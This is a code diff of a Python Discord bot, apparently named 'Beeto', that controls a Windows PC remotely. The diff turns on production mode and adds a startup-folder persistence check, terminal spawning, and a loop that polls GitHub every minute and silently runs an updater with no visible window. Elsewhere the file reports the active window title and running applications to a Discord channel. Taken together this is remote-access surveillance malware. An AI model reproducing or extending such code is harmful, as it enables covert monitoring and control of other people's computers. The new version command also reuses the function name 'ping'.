@@ -3,12 +3,10 @@ import pywinctl
 import subprocess
 import time
 import psutil
-import pyautogui
 import io
 import PIL
 import os
 import win32com.client
-import keyboard
 import sys
 import pywinctl
 from discord import option
@@ -16,19 +14,15 @@ from pywinauto import Desktop
 import psutil
 import webbrowser
 from discord.ext import tasks
-import win32gui
-import win32process
 import psutil
-from pywinauto.application import Application
 import mss
 from PIL import Image
 import requests
 
 
-TESTING = True
+TESTING = False
+VERSION = "v2"
 
-
-# Replace with your bot token and channel ID
 
 def retriveToken():
     global TESTING
@@ -49,8 +43,10 @@ def retriveToken():
 
 TOKEN = retriveToken()
 
-# CHANNEL_ID = 1391249089152155769  # MAIN
-CHANNEL_ID = 1391826973432483931  # TESTING
+if TESTING:
+    CHANNEL_ID = 1391826973432483931
+else:
+    CHANNEL_ID = 1391249089152155769
 
 intents = discord.Intents.default()
 intents.message_content = True  # Needed to read message content
@@ -68,15 +64,46 @@ async def activityChanger():
         lastText = pywinctl.getActiveWindowTitle()
         await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=lastText))
 
+
+@tasks.loop(minutes=1)
+async def updateCheck():
+    headers = {
+        'Accept': 'application/vnd.github+json',
+    }
+
+    response = requests.get('https://api.github.com/repos/GSstarGamer/betobuly/releases/latest', headers=headers)
+    response.raise_for_status()  # Raise error for bad responses
+
+    latestVersion = response.json().get("name")
+
+    if latestVersion and latestVersion != VERSION:
+        try:
+            channel = bot.get_channel(CHANNEL_ID)
+            await channel.send(content=f"New version available: {latestVersion}, Starting updater.exe and closing current build")
+
+            exe_dir = get_original_exe_path()
+            updater_path = os.path.join(exe_dir, "updater.exe")
+            if TESTING:
+                subprocess.call([sys.executable, updater_path], creationflags=subprocess.CREATE_NO_WINDOW)
+            else:
+                subprocess.Popen([updater_path], creationflags=subprocess.CREATE_NO_WINDOW)
+            await bot.close()
+            sys.exit()
+        except Exception as e: 
+            await channel.send(content=f"Error: {e}")
+
+
 @bot.event
 async def on_ready():
+    if not TESTING:
+        startUpCheck()
+        startTerms(5)
     await bot.wait_until_ready()
     channel = bot.get_channel(CHANNEL_ID)
     await channel.send(content="Beeto has logged in!")
     await channel.send(content="https://tenor.com/view/sonic-devil-diabolique-evil-gif-9725651736562738158")
-    if not TESTING:
-        startTerms(5)
     activityChanger.start()
+    updateCheck.start()
 
 
 # @client.event
@@ -117,13 +144,10 @@ async def on_ready():
 #             await message.channel.send(f"Done") 
 
 def get_original_exe_path():
-    # sys._MEIPASS only exists in PyInstaller bundle mode
-    if hasattr(sys, '_MEIPASS'):
-        # Running from a PyInstaller onefile EXE
-        return os.path.abspath(sys.argv[0])  # This points to the *original .exe* file on disk
+    if getattr(sys, 'frozen', False):
+        return os.path.dirname(sys.argv[0])
     else:
-        # Running from source (.py)
-        return os.path.abspath(__file__)
+        return os.path.dirname(os.path.abspath(__file__))
 
 def startTerms(num):
     procs = []
@@ -145,7 +169,8 @@ def startTerms(num):
 
 
 def startUpCheck():
-    actual_exe = get_original_exe_path()
+    exe_dir = get_original_exe_path()
+    actual_exe = os.path.join(exe_dir, "bot.exe") 
 
     shell = win32com.client.Dispatch("WScript.Shell")
     startup = shell.SpecialFolders("Startup")
@@ -200,6 +225,10 @@ async def ping(ctx: discord.ApplicationContext):
     await ctx.defer()
     await ctx.respond("Pong!")
 
+@bot.slash_command(name="version", description="build version")
+async def ping(ctx: discord.ApplicationContext):
+    await ctx.defer()
+    await ctx.respond(f"Version: {VERSION}")
 
 @bot.slash_command(name="running", description="List of running applications")
 async def running(ctx: discord.ApplicationContext):
